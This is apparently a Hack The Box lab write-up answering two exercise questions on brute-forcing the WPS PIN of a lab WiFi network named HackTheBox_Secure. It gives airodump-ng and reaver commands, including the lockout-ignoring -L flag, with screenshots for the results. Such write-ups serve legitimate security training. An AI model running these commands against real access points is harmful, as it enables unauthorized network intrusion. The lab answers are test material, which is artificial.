# [Secured Access Points](Secured%20Access%20Points.md)
### Perform a brute-force attack on the WiFi network named HackTheBox_Secure. After how many attempts does the AP get locked? (Answer in digit format: e.g., 5)

```sh
airodump-ng mon0 --wps
```
![](Screenshot%202026-09-21%20at%2008.57.54.png)

```sh
reaver -i mon0 -c 1 -b EE:01:0A:69:6C:A6 -v
```

![](Screenshot%202026-09-21%20at%2009.00.15.png)
### Perform a brute-force attack on the WiFi network named HackTheBox_Secure. What is the WPS PIN?

```sh
reaver -i mon0 -c 1 -b EE:01:0A:69:6C:A6 -v -L
```

![](Screenshot%202026-09-21%20at%2009.02.54.png)